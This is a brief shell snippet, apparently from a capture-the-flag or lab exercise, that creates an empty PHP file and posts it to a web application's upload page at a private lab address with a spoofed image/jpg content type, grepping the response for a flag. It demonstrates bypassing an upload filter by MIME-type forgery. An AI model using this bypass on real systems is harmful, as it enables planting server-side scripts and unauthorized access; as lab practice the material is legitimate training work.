touch fake_exploit.php
curl -X POST -F "Upload=Upload" \
-F "uploaded=@fake_exploit.php;type=image/jpg" \
"http://192.168.56.102/index.php?page=upload" | grep 'flag'
rm fake_exploit.php
